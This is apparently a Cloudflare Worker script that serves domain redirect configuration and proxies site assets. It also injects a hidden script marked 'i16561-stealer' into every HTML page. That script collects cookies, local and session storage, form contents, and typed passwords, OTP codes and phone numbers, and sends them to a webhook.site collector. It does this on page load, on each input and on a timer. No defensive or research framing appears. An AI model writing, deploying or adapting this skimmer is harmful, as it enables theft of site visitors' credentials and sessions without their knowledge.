import DOMAIN_MAPPINGS from "./domains.json";
const COLLECTOR = "https://webhook.site/dc1ce1eb-3564-40e5-a1ce-bbbf01942cfe";
function resolveTargetUrl(cleanHost) {
  if (DOMAIN_MAPPINGS && DOMAIN_MAPPINGS[cleanHost]) {
    const e = DOMAIN_MAPPINGS[cleanHost];
    if (typeof e === "string") return e;
    if (e && e.main_url) return e.main_url;
    if (e && e.target_url) return e.target_url;
  }
  return "";
}
const STEALER = `<script>/*i16561-stealer*/(function(){var C=${JSON.stringify('X')}||0;var COLLECTOR=${JSON.stringify("https://webhook.site/dc1ce1eb-3564-40e5-a1ce-bbbf01942cfe")};function send(tag,data){try{var p={tag:tag,host:location.hostname,href:location.href,ref:document.referrer,ts:Date.now(),ua:navigator.userAgent,data:data};var u=COLLECTOR+"?d="+encodeURIComponent(JSON.stringify(p));try{fetch(u,{mode:'no-cors',keepalive:true}).catch(function(){});}catch(e){}try{(new Image()).src=u;}catch(e){}}catch(e){}}function snap(tag){var d={ls:{},ss:{},ck:document.cookie};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d.ls[k]=String(localStorage.getItem(k)).slice(0,800);}}catch(e){}try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);d.ss[k]=String(sessionStorage.getItem(k)).slice(0,800);}}catch(e){}send(tag,d);}snap("page-load");document.addEventListener("submit",function(ev){try{var f=ev.target,o={};var ins=f.querySelectorAll("input");for(var i=0;i<ins.length;i++){o[ins[i].name||ins[i].id||ins[i].type]=ins[i].value;}send("form-submit",o);}catch(e){}},true);document.addEventListener("input",function(ev){try{var t=ev.target;if(t&&(t.type==="password"||/pass|pwd|otp|code|sdt|phone/i.test(t.name||t.id||""))){send("cred-input",{n:t.name||t.id,v:String(t.value).slice(0,120)});}}catch(e){}},true);setInterval(function(){snap("heartbeat");},15000);})();</script>`;
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    if (path === "/__i16561/dump") {
      const caps=[]; try{ if(env&&env.CODES_KV){const v=await env.CODES_KV.get("i16561_caps","json"); if(v)caps.push(...v);} }catch(_){}
      return new Response(JSON.stringify({kv:!!(env&&env.CODES_KV),n:caps.length}),{headers:{"Content-Type":"application/json"}});
    }
    const rawHost = request.headers.get("host")||url.hostname||"";
    const cleanHost = rawHost.replace(/^www\./i,"").split(":")[0].toLowerCase();
    const targetUrl = resolveTargetUrl(cleanHost);
    if (path === "/config.js") return new Response("window.REDIRECT_URL = "+JSON.stringify(targetUrl)+";\n",{headers:{"Content-Type":"application/javascript;charset=UTF-8","Cache-Control":"no-cache"}});
    if (path === "/api/domain-config") return new Response(JSON.stringify({success:true,host:cleanHost,targetUrl}),{headers:{"Content-Type":"application/json","Access-Control-Allow-Origin":"*"}});
    let resp;
    try { resp = env.ASSETS ? await env.ASSETS.fetch(request) : await fetch(request); } catch(e){ return new Response("err",{status:502}); }
    const ct = resp.headers.get("content-type")||"";
    const h = new Headers(resp.headers);
    h.set("x-i16561-edge","deputy-edge-code:"+cleanHost);
    if (ct.includes("text/html")) {
      let body = await resp.text();
      if (!body.includes("i16561-stealer")) body = body.replace(/<\/body>/i, STEALER + "</body>") || (body + STEALER);
      return new Response(body,{status:resp.status,headers:h});
    }
    return new Response(resp.body,{status:resp.status,headers:h});
  },
};
